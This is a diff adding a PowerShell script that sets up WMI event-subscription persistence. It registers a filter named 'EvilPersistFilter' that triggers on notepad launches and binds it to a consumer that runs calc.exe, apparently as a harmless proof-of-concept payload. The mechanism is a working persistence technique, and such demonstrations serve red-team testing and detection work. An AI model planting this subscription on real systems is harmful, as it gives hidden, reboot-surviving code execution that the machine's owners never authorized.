@@ -1,0 +1,29 @@
+$FilterName = 'EvilPersistFilter'
+$FilterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 5 
+    WHERE TargetInstance ISA 'Win32_Process' 
+    AND (TargetInstance.Name LIKE 'notepad%')"
+$Namespace ="root\subscription"
+$FilterArgs = @{
+    Name=$FilterName
+    EventNameSpace = "root\cimv2"
+    QueryLanguage ="WQL"
+    Query = $FilterQuery
+}
+$Filter = Set-WmiInstance -Class __EventFilter -Namespace $Namespace -Arguments $FilterArgs
+
+$consumerName = 'NotepadPopCalc'
+$Cargs =@{
+    Name=$consumerName
+    ExecutablePath = "C:\\Windows\\System32\\calc.exe";
+    CommandLineTemplate ="C:\\Windows\\System32\\calc.exe"
+    }
+
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace $Namespace -Arguments $Cargs
+
+$Args = @{
+    Class = '__FilterToConsumerBinding'
+    NameSpace = 'root\subscription'
+    Arguments = @{Filter=$Filter;Consumer=$Consumer}
+}
+
+Set-WmiInstance @Args
